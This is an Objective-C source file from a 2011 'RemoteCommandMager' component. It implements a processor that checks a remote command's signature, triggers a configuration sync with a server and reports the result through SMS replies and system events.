/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetUpdateConfigurationProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SyncUpdateConfigurationProcessor.h"

#import "UpdateConfigurationManager.h"

#pragma mark -
@interface SyncUpdateConfigurationProcessor (PrivateAPI)
- (void) sendReplySMS: (NSString *) aMessage isComplete: (BOOL) aComplete;
- (void) processSyncUpdateConfiguration;
- (void) processFinished;
- (void) updateConfigurationException: (NSUInteger) aErrorCode;
@end

#pragma mark -
@implementation SyncUpdateConfigurationProcessor

/**
 - Method name: initWithRemoteCommandData:withCommandProcessingDelegate:
 - Purpose:This method is used to initialize the SyncUpdateConfigurationProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (SyncUpdateConfigurationProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
   withCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate{
    DLog (@"SyncUpdateConfigurationProcessor--->initWithRemoteCommandData:withCommandProcessingDelegate:");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}

#pragma mark -
#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncUpdateConfigurationProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"SyncUpdateConfigurationProcessor--->doProcessingCommand");
	
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SyncUpdateConfigurationProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processSyncUpdateConfiguration];
}

#pragma mark -
#pragma mark UpdateConfigurationDelegate method

- (void) updateConfigurationCompleted: (NSError *) aError {
	if (!aError) {
		NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							andErrorCode:_SUCCESS_];
		NSString *syncUpdateConfigMessage=[NSString stringWithFormat:@"%@%@",messageFormat,NSLocalizedString(@"kSyncUpdateConfigurationMSG2", @"")];
		[self sendReplySMS:syncUpdateConfigMessage isComplete:YES];
	} else {
		NSString *syncUpdateConfigMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							andErrorCode:[aError code]];
		[self sendReplySMS:syncUpdateConfigMessage isComplete:YES];
	}
}

#pragma mark -
#pragma mark SyncUpdateConfigurationProcessor Private Methods

/**
 - Method name: processSyncUpdateConfiguration
 - Purpose:This method is used to sync the configuration id with the server
 - Argument list and description: No arguments
 - Return description: No return type
*/

- (void) processSyncUpdateConfiguration {
	DLog (@"SyncUpdateConfigurationProcessor--->processSyncUpdateConfiguration");
	id <UpdateConfigurationManager> updateConfigurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mUpdateConfigurationManager];
	if ([updateConfigurationManager updateConfiguration:self]) {
		NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							andErrorCode:_SUCCESS_];
		NSString *syncUpdateConfigMessage=[NSString stringWithFormat:@"%@%@",messageFormat,NSLocalizedString(@"kSyncUpdateConfigurationMSG1", @"")];
		[self sendReplySMS:syncUpdateConfigMessage isComplete:NO];
	} else {
		[self updateConfigurationException:kUpdateConfigurationManagerBusy];
	}
}

/**
 - Method name: sendReplySMS:isComplete:
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aMessage (NSString *) aComplete (BOOL)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aMessage isComplete: (BOOL) aComplete {
	DLog (@"SyncUpdateConfigurationProcessor--->sendReplySMS:isComplete:");
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {		
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:aMessage];
	}
	
	if (aComplete) {
		[self processFinished];
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when Sync Configuration Process is completed.
 - Argument list and description:No Argument 
 - Return description:No Return Type
 */

-(void) processFinished {
	DLog (@"SyncUpdateConfigurationProcessor--->Process Finished...")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)
										   withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: updateConfigurationException
 - Purpose:This method is invoked when update configuration failed, cannot submit request to Configuration Manager. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) updateConfigurationException: (NSUInteger) aErrorCode {
	DLog (@"SyncUpdateConfigurationProcessor--->updateConfigurationException")
	FxException* exception = [FxException exceptionWithName:@"SyncUpdateConfigurationProcessor" andReason:@"Update Configuration Error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle maemory 
 - Argument list and description:No Argument
 - Return description:No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
